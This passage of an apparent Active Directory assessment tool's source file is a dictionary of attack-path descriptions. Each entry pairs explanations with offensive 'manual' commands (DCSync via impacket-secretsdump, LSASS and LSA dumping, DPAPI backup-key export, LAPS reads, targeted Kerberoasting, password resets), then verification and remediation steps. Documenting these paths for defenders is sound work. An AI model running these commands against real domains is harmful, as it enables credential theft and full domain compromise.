            "Configure 'Deny log on locally' and 'Deny log on through Remote Desktop Services' user-rights GPOs for Tier-0 groups on all non-Tier-0 systems.",
            "Monitor Event ID 4698 (scheduled task created) and 4624/4672 (privileged logon) on member servers; a task registered under another user's session, or a Tier-0 logon to a workstation, should be investigated immediately.",
        ),
    },
    "scheduledtask": {
        "short": (
            "With admin on {target}, an attacker registers a scheduled task whose "
            "principal is a logged-on user's session, so the task runs as that user "
            "and impersonates them."
        ),
        "long": (
            "The Windows Task Scheduler can register a task to run in the context of "
            "an existing interactive logon session. An attacker holding "
            "administrator rights on {target} uses this as an impersonation "
            "primitive: it creates a task bound to the logon session of a user who "
            "is currently signed in — for example a privileged operator — and when "
            "the task fires it executes with that user's token and privileges, "
            "without the attacker ever recovering a password or hash. It is the "
            "concrete abuse behind an observed high-value session on a host: local "
            "admin plus the Task Scheduler RPC interface is enough to convert "
            "'someone privileged is logged on here' into 'I am now acting as that "
            "someone'. The technique is a standard lateral-movement / privilege-"
            "inheritance step once a member server is under control."
        ),
        "manual": (
            "# Register + run a task under the target host (Task Scheduler RPC over SMB):\n"
            "impacket-atexec -k -no-pass <domain>/<user>@{target} 'whoami'\n"
            "#   (or, to impersonate a specific logged-on user's session, schtasks the\n"
            "#    task with that session's principal once admin is established)"
        ),
        "verify_windows": (
            "Inspect scheduled tasks on the host and the principal each runs as — "
            "a task bound to a user session that no admin created is suspicious:\n"
            "Invoke-Command -ComputerName {target} -ScriptBlock "
            "{{ Get-ScheduledTask | Select-Object TaskName, "
            "@{{n='RunAs';e={{$_.Principal.UserId}}}} }}\n"
            "# Confirm who is logged on (the impersonation target):\n"
            "Invoke-Command -ComputerName {target} -ScriptBlock {{ query user }}"
        ),
        "verify_linux": (
            "Read-only enumeration of logged-on users (the impersonation targets) "
            "on the host:\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain> --loggedon-users\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/impersonation"
        ),
        "remediation": (
            "Restrict local administrator rights on the host (the prerequisite): Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }, removing every principal that does not require them.",
            "Enforce tier separation so privileged accounts do not maintain interactive sessions on member servers where a local-admin compromise could impersonate them via a scheduled task.",
            "Enable Task Scheduler operational logging and audit task creation (Event ID 4698); alert on tasks whose principal is a logged-on user session and that were not created by a change-managed process.",
            "Add high-value accounts to Protected Users and apply 'Deny log on locally' GPOs for Tier-0 groups on non-Tier-0 hosts to shrink the set of sessions worth impersonating.",
        ),
    },
    "getchanges": {
        "short": (
            "{source} holds the DS-Replication-Get-Changes right on {target}; on its "
            "own it is partial, but combined with Get-Changes-All it enables DCSync "
            "to replicate secrets."
        ),
        "long": (
            "DCSync abuses the directory replication protocol (MS-DRSR) that domain "
            "controllers use to synchronise with one another: a principal holding "
            "the replication control-access rights can ask a DC to replicate "
            "account data as if it were another DC, receiving credential material "
            "without touching the ntds.dit file directly. DS-Replication-Get-Changes "
            "is the FIRST of the two rights that combine to make this possible — by "
            "itself it authorises replication of standard object attributes but not "
            "the secret attributes. It becomes dangerous when {source_type} {source} "
            "ALSO holds DS-Replication-Get-Changes-All on {target} (the domain "
            "object): the pair together lets the replication request pull secret "
            "attributes such as password hashes. This right is normally held only by "
            "Domain Controllers, Domain Admins, and Enterprise Admins, so finding it "
            "granted to any other principal on the domain head is a serious "
            "misconfiguration."
        ),
        "manual": (
            "# With the replication rights, replicate a specific account's secrets:\n"
            "impacket-secretsdump -k -no-pass -just-dc-user <target-account> <domain>/<user>@<dc_fqdn>\n"
            "#   (or the whole directory)  impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>"
        ),
        "verify_windows": (
            "Read the domain head's ACL and list every principal granted the "
            "Get-Changes replication right — only DCs/DA/EA should appear:\n"
            "(Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access |\n"
            "  Where-Object {{ $_.ObjectType -eq "
            "'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' }} |\n"
            "  Select-Object IdentityReference, ActiveDirectoryRights\n"
            "# (GUID 1131f6aa-... = DS-Replication-Get-Changes)"
        ),
        "verify_linux": (
            "Enumerate who holds the replication rights over the domain object "
            "(read-only ACL analysis):\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "get object <domain-DN> --attr nTSecurityDescriptor\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
        ),
        "remediation": (
            "List every principal holding the replication rights on the domain object and remove any that is not a Domain Controller: (Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access | Where-Object { $_.ObjectType -in '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' }.",
            "Revoke the delegated ACE with dsacls on the domain head (dsacls \"<domain-DN>\" /R \"<principal>\") so only the built-in Domain Controllers group, Domain Admins, and Enterprise Admins retain Get-Changes / Get-Changes-All.",
            "Investigate how the right was delegated (a misconfigured GPO, an over-broad delegation wizard run, or a legacy sync account) and correct the source so it is not re-applied.",
            "Enable directory-service-access auditing and alert on Event ID 4662 with the replication access mask from any principal that is not a domain controller — that is the DCSync signature.",
        ),
    },
    "getchangesall": {
        "short": (
            "{source} holds DS-Replication-Get-Changes-All on {target} — the right "
            "that unlocks SECRET attributes in replication, so paired with "
            "Get-Changes it enables full DCSync of password hashes."
        ),
        "long": (
            "DS-Replication-Get-Changes-All is the SECOND and decisive replication "
            "control-access right in the DCSync pair. Where plain Get-Changes "
            "authorises replication of ordinary attributes, Get-Changes-All is what "
            "authorises replication of the SECRET attributes — unicodePwd, the NTLM "
            "and Kerberos keys, supplemental credentials — for any account in the "
            "domain, including krbtgt. When {source_type} {source} holds this right "
            "on {target} (the domain object) together with Get-Changes, it can issue "
            "a replication request over MS-DRSR and receive every credential hash in "
            "the directory without dumping ntds.dit on disk. Extracting the krbtgt "
            "key from that data is full, persistent domain compromise (Golden "
            "Tickets). This right is meant to exist only on Domain Controllers, "
            "Domain Admins, and Enterprise Admins, so its presence on any other "
            "principal is the highest-severity ACL finding on the domain head."
        ),
        "manual": (
            "# Full DCSync of the directory (both rights present):\n"
            "impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>\n"
            "#   (target only krbtgt for a Golden Ticket key)\n"
            "impacket-secretsdump -k -no-pass -just-dc-user krbtgt <domain>/<user>@<dc_fqdn>"
        ),
        "verify_windows": (
            "List principals granted the Get-Changes-All replication right on the "
            "domain head — only DCs/DA/EA should appear:\n"
            "(Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access |\n"
            "  Where-Object {{ $_.ObjectType -eq "
            "'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' }} |\n"
            "  Select-Object IdentityReference, ActiveDirectoryRights\n"
            "# (GUID 1131f6ad-... = DS-Replication-Get-Changes-All)"
        ),
        "verify_linux": (
            "Enumerate who holds the Get-Changes-All right over the domain object "
            "(read-only ACL analysis):\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "get object <domain-DN> --attr nTSecurityDescriptor\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
        ),
        "remediation": (
            "Enumerate every principal holding Get-Changes-All on the domain object and remove any that is not a Domain Controller: (Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access | Where-Object { $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' }.",
            "Revoke the offending ACE with dsacls (dsacls \"<domain-DN>\" /R \"<principal>\") so replication of secret attributes is restricted to Domain Controllers, Domain Admins, and Enterprise Admins.",
            "Because this right permits krbtgt extraction, treat any past exposure as full domain compromise: after removing the ACE, rotate the krbtgt account password twice (with the replication interval between resets) to invalidate any forged Golden Tickets.",
            "Alert on Event ID 4662 carrying the replication access mask from any non-DC principal, and correct the delegation source (GPO / delegation wizard / legacy account) that granted the right.",
        ),
    },
    "getchangesinfilteredset": {
        "short": (
            "{source} holds DS-Replication-Get-Changes-In-Filtered-Set on {target}, "
            "a supplemental replication right that exposes filtered-attribute-set "
            "data (e.g. LAPS) some directories protect from ordinary DCSync."
        ),
        "long": (
            "The Filtered Attribute Set (FAS) is a group of confidential attributes "
            "that domain controllers do NOT replicate to Read-Only Domain "
            "Controllers, and that plain DCSync (Get-Changes + Get-Changes-All) does "
            "not necessarily return. DS-Replication-Get-Changes-In-Filtered-Set is "
            "the extra control-access right that authorises replication of that "
            "filtered set. It matters because confidential secrets — notably the "
            "LAPS local-admin password attribute and other sensitive custom "
            "attributes — can live in the FAS. When {source_type} {source} holds "
            "this right on {target} in addition to the standard replication rights, "
            "its DCSync can also pull the filtered attributes, widening the secret "
            "exposure beyond ordinary account hashes. Like the other two "
            "replication rights it is intended for Domain Controllers only, so a "
            "delegation of it to any other principal is a misconfiguration to "
            "correct."
        ),
        "manual": (
            "# With all replication rights, a directory dump can also return the\n"
            "# filtered-set attributes (e.g. LAPS) alongside account hashes:\n"
            "impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>\n"
            "#   (LAPS password attribute is exposed to the same replication reach)"
        ),
        "verify_windows": (
            "List who holds the Get-Changes-In-Filtered-Set right on the domain "
            "head — only Domain Controllers should:\n"
            "(Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access |\n"
            "  Where-Object {{ $_.ObjectType -eq "
            "'89e95b76-444d-4c62-991a-0facbeda640c' }} |\n"
            "  Select-Object IdentityReference, ActiveDirectoryRights\n"
            "# (GUID 89e95b76-... = DS-Replication-Get-Changes-In-Filtered-Set)"
        ),
        "verify_linux": (
            "Read-only ACL analysis of who holds the filtered-set replication right "
            "over the domain object:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "get object <domain-DN> --attr nTSecurityDescriptor\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
        ),
        "remediation": (
            "Enumerate every principal granted DS-Replication-Get-Changes-In-Filtered-Set on the domain object and remove any non-Domain-Controller: (Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access | Where-Object { $_.ObjectType -eq '89e95b76-444d-4c62-991a-0facbeda640c' }.",
            "Revoke the delegated ACE with dsacls on the domain head so the filtered-set replication right is restricted to Domain Controllers alongside the other two replication rights.",
            "Because the filtered set can carry LAPS and other confidential attributes, rotate any LAPS-managed local passwords that were exposed while the right was misconfigured (Reset-AdmPwdPassword / Reset-LapsPassword).",
            "Audit Event ID 4662 for replication access from non-DC principals and correct the delegation source that granted the right.",
        ),
    },
    "dumplsa": {
        "short": (
            "With SYSTEM on {target}, an attacker reads the LSA secrets from the "
            "SECURITY registry hive, recovering service-account passwords, cached "
            "credentials, and the host's own machine-account key."
        ),
        "long": (
            "The Local Security Authority stores a set of persistent secrets in the "
            "SECURITY registry hive: the plaintext passwords of services configured "
            "to run as a domain account, DPAPI machine keys, auto-logon "
            "credentials, and the computer's own machine-account key. An attacker "
            "who reaches SYSTEM on {target} can read the SECURITY and SYSTEM hives "
            "and decrypt these LSA secrets offline. This is a distinct source from "
            "LSASS process memory: LSA secrets are on disk in the registry and "
            "survive reboots, so they yield persistent service-account and "
            "machine-account credentials even when no interesting user is currently "
            "logged on. A recovered service-account password is often a domain "
            "credential that unlocks further lateral movement, and the "
            "machine-account key enables Kerberos actions as the host. The "
            "prerequisite is administrative (SYSTEM) access on the target."
        ),
        "manual": (
            "# Read LSA secrets remotely (recovers service-account + machine-account keys):\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain> --lsa\n"
            "#   (or, Kerberos-only)  impacket-secretsdump -k -no-pass <domain>/<user>@<target-fqdn>"
        ),
        "verify_windows": (
            "Confirm the account is a local admin (the prerequisite) and inspect "
            "which services run as a domain account (whose passwords are stored as "
            "LSA secrets):\n"
            "Invoke-Command -ComputerName {target} -ScriptBlock {{ Get-CimInstance "
            "Win32_Service | Where-Object {{ $_.StartName -like '*\\\\*' }} |\n"
            "  Select-Object Name, StartName }}"
        ),
        "verify_linux": (
            "Confirm admin reach over the host (read-only marker, no dump):\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == LSA-dump-capable\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets"
        ),
        "remediation": (
            "Inventory services running under domain accounts on the host (Get-CimInstance Win32_Service | Where-Object { $_.StartName -like '*\\*' }) and migrate them to Group Managed Service Accounts (gMSA), whose passwords are managed by the domain and never stored as recoverable LSA secrets.",
            "Rotate every service-account password that was ever configured on a host an attacker could reach, treating the exposed values as compromised.",
            "Restrict local administrator rights on member servers and enforce tier separation so an attacker cannot reach SYSTEM to read the SECURITY hive in the first place.",
            "Monitor Event IDs 4656/4663 for handle/access requests to the SECURITY and SYSTEM registry hives and Event 4688 for the tooling that reads them, and alert on remote registry access outside change windows.",
        ),
    },
    "dumplsass": {
        "short": (
            "With SYSTEM on {target}, an attacker reads the LSASS process memory and "
            "recovers the plaintext passwords, NTLM hashes, and Kerberos tickets of "
            "every account currently logged on."
        ),
        "long": (
            "The Local Security Authority Subsystem Service (lsass.exe) holds, in "
            "memory, the credential material of every session on the host: NTLM "
            "hashes, Kerberos TGTs and keys, and — depending on configuration — "
            "cleartext passwords. An attacker who reaches SYSTEM on {target} can "
            "read that process memory and extract those credentials, immediately "
            "harvesting the secrets of any privileged user who has logged on there. "
            "This is the classic pivot that turns one host into many: dump LSASS on "
            "a member server where a domain admin recently authenticated and you "
            "hold that admin's credentials. Modern EDR in blocking mode intercepts "
            "direct reads of LSASS, so on a monitored host this step may be blocked "
            "or alert loudly; safer alternatives that avoid touching LSASS include "
            "reading LSA secrets from the registry, DPAPI offline, or fetching "
            "gMSA/LAPS material over the directory. The prerequisite is "
            "administrative (SYSTEM) access on the target."
        ),
        "manual": (
            "# Dump LSASS and parse credentials remotely (SYSTEM required):\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain> -M lsassy\n"
            "#   (or, obtain a dump and parse offline with an LSASS parser)"
        ),
        "verify_windows": (
            "Confirm the account is a local admin (the prerequisite) and check "
            "whether LSASS is protected (RunAsPPL) and Credential Guard is enabled "
            "— both harden this path:\n"
            "Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' "
            "-Name RunAsPPL -ErrorAction SilentlyContinue\n"
            "Get-CimInstance -ClassName Win32_DeviceGuard -Namespace "
            "root\\Microsoft\\Windows\\DeviceGuard"
        ),
        "verify_linux": (
            "Confirm admin reach over the host (read-only marker, no dump):\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == LSASS-dump-capable\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass"
        ),
        "remediation": (
            "Enable LSA Protection (RunAsPPL) via GPO (Computer Configuration > Policies > Administrative Templates > System > Local Security Authority) so LSASS runs as a protected process and its memory cannot be read by ordinary admin tooling.",
            "Deploy Credential Guard on supported hosts (verified with Get-CimInstance Win32_DeviceGuard) so NTLM hashes and Kerberos keys are isolated in a virtualized secure world outside LSASS.",
            "Enforce tier separation and add Tier-0 accounts to Protected Users so privileged credentials are never cached in LSASS on member servers where a local-admin compromise could read them.",
            "Restrict local administrator rights and monitor Event ID 4656/4663 for process-access handles to lsass.exe with read rights, which is the credential-dumping signature.",
        ),
    },
    "dumpdpapi": {
        "short": (
            "With admin on {target}, an attacker recovers DPAPI master keys and "
            "decrypts the user secrets DPAPI protects — saved browser and RDP "
            "passwords, credentials in Credential Manager, and more."
        ),
        "long": (
            "The Data Protection API (DPAPI) is what Windows uses to encrypt "
            "per-user secrets at rest: passwords saved in browsers, RDP connection "
            "credentials, Wi-Fi keys, and anything stored via Credential Manager. "
            "Each user's secrets are protected by a DPAPI master key, which is "
            "itself derived from the user's password (or, for domain accounts, "
            "recoverable via the domain's DPAPI backup key held on the DC). An "
            "attacker with administrative access on {target} can harvest the "
            "encrypted master keys and credential blobs from the user profile and "
            "decrypt them — either by knowing the user's password, by extracting the "
            "master key from LSASS while the user is logged on, or, most powerfully, "
            "by using the domain DPAPI backup key to decrypt ANY domain user's DPAPI "
            "secrets. This yields cleartext application and service credentials that "
            "are invisible to hash-based defences. The prerequisite is admin on the "
            "host holding the profile (or the domain backup key for the domain-wide "
            "route)."
        ),
        "manual": (
            "# Recover the domain DPAPI backup key (needs DA-level rights on the DC):\n"
            "impacket-dpapi backupkeys -t <domain>/<user>:<pass>@<dc_ip> --export\n"
            "# Decrypt a user's master key, then a credential/vault blob:\n"
            "impacket-dpapi masterkey -file <masterkey_file> -pvk <backupkey.pvk>\n"
            "impacket-dpapi credential -file <credential_blob> -key <decrypted_masterkey>"
        ),
        "verify_windows": (
            "Confirm the account is a local admin (the prerequisite) and locate the "
            "DPAPI master keys and credential blobs in a user profile:\n"
            "Invoke-Command -ComputerName {target} -ScriptBlock {{ Get-ChildItem "
            "\"$env:APPDATA\\Microsoft\\Protect\" -Recurse -Force }}\n"
            "# The domain DPAPI backup key lives on the DC and is DA-protected."
        ),
        "verify_linux": (
            "Confirm admin reach over the host holding the profile (read-only "
            "marker, no decryption):\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == DPAPI-reachable\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi"
        ),
        "remediation": (
            "Protect the domain DPAPI backup key: it is stored on the domain controllers and decrypts every domain user's DPAPI secrets, so treat its exposure as domain-wide credential compromise and restrict DA-level access to DCs.",
            "Discourage storing recoverable secrets in DPAPI-protected stores where possible — disable browser password saving via policy and prefer an enterprise secret manager for service credentials.",
            "Enforce tier separation and Protected Users so a privileged user's DPAPI master key is not present in LSASS on member servers a local-admin compromise can reach.",
            "Monitor Event ID 4662 for reads of the domain DPAPI backup key object (BCKUPKEY) and Event 4663 for access to the Protect\\ profile folders; alert on backup-key export outside change windows.",
        ),
    },
    "synclapspassword": {
        "short": (
            "{source} can read or replicate the LAPS-managed local administrator "
            "password of {target}, recovering the cleartext local admin credential "
            "from the directory."
        ),
        "long": (
            "The Local Administrator Password Solution (LAPS) stores each domain-"
            "joined computer's randomised local administrator password in a "
            "directory attribute on the computer object — ms-Mcs-AdmPwd for legacy "
            "LAPS, or the msLAPS-Password / msLAPS-EncryptedPassword attributes for "
            "Windows LAPS. Read access to that confidential attribute is meant to be "
            "restricted to a small set of administrators, but a misconfigured ACL "
            "can grant it to a broader principal. When {source_type} {source} can "
            "read (or replicate) the LAPS attribute of {target}, it recovers that "
            "host's current local administrator password in cleartext and can log on "
            "with full local admin rights — from there dumping cached credentials "
            "and pivoting onward. Because the password is stored in the directory, "
            "no code execution on the target is needed: a single over-permissive "
            "read ACE turns directory access into host compromise."
        ),
        "manual": (
            "# Read the LAPS local-admin password from the computer object (legacy LAPS):\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --module laps\n"
            "#   (or) bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "get object {target} --attr ms-Mcs-AdmPwd"
        ),
        "verify_windows": (
            "List which principals can READ the LAPS password attribute on the "
            "computer object — only sanctioned admins should:\n"
            "(Get-Acl \"AD:$((Get-ADComputer {target}).DistinguishedName)\").Access |\n"
            "  Where-Object {{ $_.ActiveDirectoryRights -match 'ReadProperty' }} |\n"
            "  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType\n"
            "# Or confirm the attribute is populated:\n"
            "Get-ADComputer {target} -Properties ms-Mcs-AdmPwd, msLAPS-Password"
        ),
        "verify_linux": (
            "Read-only enumeration of who can read the LAPS attribute (no password "
            "retrieved):\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --module laps\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/read-laps-password"
        ),
        "remediation": (
            "Review the read ACL on the LAPS password attribute for the computer object and remove every principal that is not a sanctioned administrator: Find-AdmPwdExtendedRights -Identity <OU> (legacy LAPS) or Find-LapsADExtendedRights -Identity <OU> (Windows LAPS).",
            "Migrate legacy Microsoft LAPS (ms-Mcs-AdmPwd, stored in cleartext in the directory) to Windows LAPS with encrypted password storage (msLAPS-EncryptedPassword) so the attribute is not readable in cleartext even by an over-permissive ACE.",
            "Scope LAPS read delegation per-OU to the specific admin group responsible for those hosts, never to broad groups such as Authenticated Users; re-apply the delegation with Set-AdmPwdReadPasswordPermission / Set-LapsADReadPasswordPermission.",
            "Rotate the exposed local passwords immediately (Reset-AdmPwdPassword / Reset-LapsPassword) and audit Event ID 4662 for reads of the LAPS attribute by unexpected principals.",
        ),
    },
    "kerberoskeylist": {
        "short": (
            "Using a forged RODC golden ticket, {source} issues a Kerberos Key List "
            "request to a writable domain controller and recovers the account's NT "
            "hash for {target} without DCSync."
        ),
        "long": (
            "A compromised Read-Only Domain Controller (or control of a per-RODC "
            "krbtgt account) lets an attacker forge a golden ticket scoped to that "
            "RODC. The Kerberos Key List attack then abuses a legitimate protocol "
            "feature: presenting that ticket, {source_type} {source} sends a Key "
            "List request (a KERB-KEY-LIST-REQ) to a writable domain controller, "
            "which returns the long-term key — the NT hash — of the target account "
            "{target}. This recovers credential material without a directory-"
            "replication (DCSync) request, so it can succeed where the replication "
            "rights are not held, and it works only when AES key material exists for "
            "the per-RODC krbtgt account being abused. The result is an account NT "
            "hash usable for pass-the-hash or offline cracking, and if the target is "
            "a privileged account it is a direct escalation. The prerequisite is "
            "control over an RODC's krbtgt secret and reachability to a writable DC."
        ),
        "manual": (
            "# With a forged RODC golden ticket in the ccache, request the Key List\n"
            "# data (NT hash) for a target account from a writable DC:\n"
            "impacket-getST -k -no-pass -key-list <domain>/{target}\n"
            "#   (the RODC-scoped ticket must already be present, e.g. KRB5CCNAME set)"
        ),
        "verify_windows": (
            "Inspect the RODC's password-replication policy — which accounts' "
            "secrets the RODC is allowed to cache is what bounds this attack:\n"
            "Get-ADDomainControllerPasswordReplicationPolicy -Identity <RODC> "
            "-Allowed\n"
            "# Confirm the per-RODC krbtgt account and its key material:\n"
            "Get-ADUser -Filter 'name -like \"krbtgt_*\"' -Properties "
            "msDS-KrbTgtLinkBl"
        ),
        "verify_linux": (
            "Read-only enumeration of the RODC krbtgt accounts (no ticket forged):\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> "
            "--query '(name=krbtgt_*)' 'name'\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/kerberos-key-list-attack"
        ),
        "remediation": (
            "Harden every RODC's password-replication policy: keep the Allowed list minimal and never permit an RODC to cache Tier-0 account secrets (Get-ADDomainControllerPasswordReplicationPolicy -Identity <RODC> -Allowed / -Denied).",
            "Treat a compromised RODC as compromise of every account whose secret it was allowed to cache: rotate those account passwords and the per-RODC krbtgt account (msDS-KrbTgtLink) after any RODC compromise.",
            "Physically and logically protect RODCs to the standard of the accounts they cache; a branch-office RODC that caches privileged accounts is a Tier-0 exposure.",
            "Monitor writable DCs for Key List requests (Event ID 4769 for the target account paired with an RODC-scoped ticket) and investigate any that do not originate from a legitimate RODC.",
        ),
    },
    "owns": {
        "short": (
            "{source} is the OWNER of {target}, and an object's owner can always "
            "rewrite its DACL, so ownership is implicit full control over {target}."
        ),
        "long": (
            "In Active Directory the owner of an object holds the implicit "
            "WRITE_DAC and READ_CONTROL rights regardless of the object's DACL: an "
            "owner can always read and rewrite the object's own permissions. So when "
            "{source_type} {source} owns {target}, it can grant itself any explicit "
            "right it wants (FullControl / GenericAll) by editing the DACL, and from "
            "there run whatever technique that right enables — resetting a user's "
            "password, configuring RBCD on a computer, adding a key credential for "
            "PKINIT, or, if the target is the domain object, granting itself the "
            "replication rights for DCSync. Ownership is therefore functionally "
            "equivalent to GenericAll, but it is easy to overlook because it is not "
            "listed as an ACE in the DACL — it is the owner field of the security "
            "descriptor. Unexpected ownership of a sensitive object (a privileged "
            "user, a computer, an OU, or the domain head) is a direct control "
            "finding."
        ),
        "manual": (
            "# Grant yourself full control over the object you own, then abuse it:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "add genericAll {target} <user>\n"
            "#   (or, using the ACE editor)  dacledit.py -action write -rights FullControl "
            "-principal <user> -target {target} <domain>/<user>:<pass>"
        ),
        "verify_windows": (
            "Read the owner of the object's security descriptor — an unexpected "
            "owner is the finding:\n"
            "(Get-Acl \"AD:$((Get-ADObject -Filter \"Name -eq '{target}'\")."
            "DistinguishedName)\").Owner\n"
            "# Or, directly:\n"
            "Get-ADObject -LDAPFilter '(name={target})' -Properties nTSecurityDescriptor |\n"
            "  ForEach-Object {{ $_.nTSecurityDescriptor.Owner }}"
        ),
        "verify_linux": (
            "Read-only lookup of the object's owner via its security descriptor:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "get object {target} --attr nTSecurityDescriptor\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dacl"
        ),
        "remediation": (
            "Read the object's owner and, where it is wrong, reset it to the correct administrative principal: Set-Acl on the AD path after building an owner with $acl.SetOwner([System.Security.Principal.NTAccount]'DOMAIN\\Domain Admins'), or dsacls \"<object-DN>\" /takeownership.",
            "Investigate how ownership was acquired — an object created by a low-privileged account is owned by that account by default, and a Creator Owner ACE or a delegated create right on the parent OU is the usual source; correct the delegation so new objects are owned by an administrative group.",
            "For sensitive containers, set the default owner on the parent OU and enable inheritance so newly created objects are owned by the intended administrative group, not by whoever ran the wizard.",
            "Audit ownership of privileged users, computers, OUs, and the domain head periodically, and alert on Event ID 5136 modifications to the owner field of Tier-0 objects.",
        ),
    },
    "allextendedrights": {
        "short": (
            "{source} holds All-Extended-Rights over {target}, a superset of the "
            "control-access rights that includes password reset, LAPS read, and "
            "DCSync — so it can fully control {target}."
        ),
        "long": (
            "Extended rights are the special control-access rights AD defines beyond "
            "ordinary read/write, each identified by a rights-GUID: Reset Password, "
            "the DS-Replication-Get-Changes(-All) rights that make DCSync, the "
            "ms-Mcs-AdmPwd (LAPS) read right, and others. AllExtendedRights grants "
            "the WHOLE set at once. So when {source_type} {source} holds "
            "AllExtendedRights over {target}, it holds every one of those rights "
            "simultaneously: it can reset the target user's password, read the "
            "target computer's LAPS password, or — if the target is the domain "
            "object — perform DCSync. It is one of the most powerful ACEs to find on "
            "a sensitive object because it collapses many distinct escalation "
            "techniques into a single grant, and it is often introduced by an "
            "over-broad delegation (a help-desk delegation applied at too high a "
            "scope, for instance). The concrete follow-on depends on the target's "
            "type, but in every case AllExtendedRights over a privileged object is a "
            "direct path to controlling it."
        ),
        "manual": (
            "# Target USER — reset the password using the extended right:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "set password {target} 'Newp@ss123!'\n"
            "# Target COMPUTER — read its LAPS local-admin password:\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --module laps\n"
            "# Target DOMAIN object — the set includes the replication rights (DCSync):\n"
            "impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>"
        ),
        "verify_windows": (
            "List the ACEs that grant All-Extended-Rights (ObjectType all-zeros GUID "
            "with the ExtendedRight bit) over the object:\n"
            "(Get-Acl \"AD:$((Get-ADObject -LDAPFilter '(name={target})')."
            "DistinguishedName)\").Access |\n"
            "  Where-Object {{ $_.ActiveDirectoryRights -match 'ExtendedRight' -and "
            "$_.ObjectType -eq '00000000-0000-0000-0000-000000000000' }} |\n"
            "  Select-Object IdentityReference, ActiveDirectoryRights"
        ),
        "verify_linux": (
            "Read-only ACL analysis of who holds extended rights over the object:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "get object {target} --attr nTSecurityDescriptor\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dacl"
        ),
        "remediation": (
            "Enumerate the ACEs granting All-Extended-Rights over the object and remove any that is not a required administrator: (Get-Acl \"AD:<object-DN>\").Access | Where-Object { $_.ActiveDirectoryRights -match 'ExtendedRight' -and $_.ObjectType -eq '00000000-0000-0000-0000-000000000000' }.",
            "Revoke the over-broad ACE with dsacls (dsacls \"<object-DN>\" /R \"<principal>\") and replace it, where a delegation is genuinely needed, with the single specific extended right required (e.g. only Reset Password) rather than the whole set.",
            "Find the delegation source — an AllExtendedRights ACE applied at an OU or the domain root usually comes from a delegation wizard run at too high a scope — and re-scope it to the narrowest OU and the least-privilege right.",
            "Audit Event ID 5136 for ACL changes on Tier-0 objects and alert on any new AllExtendedRights grant to a non-administrative principal.",
        ),
    },
    "writespn": {
        "short": (
            "{source} can write a servicePrincipalName onto {target}, making the "
            "account kerberoastable on demand so its password hash can be requested "
            "and cracked offline."
        ),
        "long": (
            "Write access to the servicePrincipalName attribute of a target account "
            "is a targeted-Kerberoasting primitive. Kerberoasting normally works "
            "only against accounts that already have an SPN; but if {source_type} "
            "{source} can WRITE the SPN attribute of {target}, it can ADD an "
            "arbitrary SPN to that account, then request a service ticket (TGS-REP) "
            "for it. Because the ticket is encrypted with the target account's "
            "password-derived key, the attacker cracks it offline to recover the "
            "password — and afterwards can remove the SPN it added to cover its "
            "tracks. This converts a benign-looking attribute-write ACE into "
            "credential theft against any account whose password is crackable, "
            "including service and even privileged accounts. The write is usually "
            "exposed by an over-broad WriteProperty ACE on the account object. It is "
            "sometimes called 'targeted Kerberoasting' because the attacker chooses "
            "the victim rather than relying on whoever already has an SPN."
        ),
        "manual": (
            "# Add an SPN to the target, then roast it, then clean up:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "set object {target} servicePrincipalName -v 'fake/svc'\n"
            "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> "
            "-request-user {target} -outputfile roast.txt\n"
